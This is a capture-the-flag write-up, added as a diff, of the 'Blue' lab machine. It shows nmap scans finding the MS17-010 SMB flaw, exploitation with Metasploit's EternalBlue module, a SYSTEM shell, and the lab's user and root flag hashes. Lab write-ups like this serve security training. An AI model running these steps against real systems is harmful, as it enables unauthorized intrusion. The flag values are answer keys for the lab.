@@ -1,0 +1,139 @@
+I start off with an nmap scan:
+└─# nmap -sC -sV -A 10.10.10.40
+PORT      STATE SERVICE      VERSION
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+Host script results:
+|_clock-skew: mean: -18m12s, deviation: 34m35s, median: 1m45s
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: haris-PC
+|   NetBIOS computer name: HARIS-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-06-02T09:51:01+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-02T08:50:59
+|_  start_date: 2021-06-02T08:49:36
+
+We quickly run a vulnerability scan over smb:
+└─# nmap --script smb-vuln* -p 445 10.10.10.40
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+I proceed online to search for eternal blue vulnerability exploit.
+Using metasploit:
+msf6 exploit(windows/smb/ms17_010_eternalblue) >
+C:\>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID     
+=================== ========
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID                                                             Attributes                                                     
+====================================== ================ =============================================================== ===============================================================
+Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                                                                                   
+Everyone                               Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group             
+BUILTIN\Users                          Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group             
+CONSOLE LOGON                          Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group             
+NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group             
+NT SERVICE\Spooler                     Well-known group S-1-5-80-3951239711-1671533544-1416304335-3763227691-3930497994 Enabled by default, Enabled group, Group owner                 
+LOCAL                                  Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group, Group owner
+BUILTIN\Administrators                 Alias            S-1-5-32-544                                                    Mandatory group, Enabled by default, Enabled group             
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeTcbPrivilege                Act as part of the operating system       Enabled 
+SeAuditPrivilege              Generate security audits                  Enabled 
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is A0EF-1911
+
+ Directory of C:\Users
+
+21/07/2017  07:56    <DIR>          .
+21/07/2017  07:56    <DIR>          ..
+21/07/2017  07:56    <DIR>          Administrator
+14/07/2017  14:45    <DIR>          haris
+12/04/2011  08:51    <DIR>          Public
+               0 File(s)              0 bytes
+               5 Dir(s)  17,444,278,272 bytes free
+
+
+
+ Directory of C:\Users\haris\Desktop
+
+21/07/2017  07:54                32 user.txt
+
+
+C:\Users\haris\Desktop>type user.txt
+type user.txt
+4c546aea7dbee75cbd71de245c8deea9
+
+C:\Users>cd Administrator/Desktop
+cd Administrator/Desktop
+
+C:\Users\Administrator\Desktop>dir
+
+ Directory of C:\Users\Administrator\Desktop
+
+21/07/2017  07:57                32 root.txt
+         
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+ff548eb71e920ff6c08843ce9df4e717
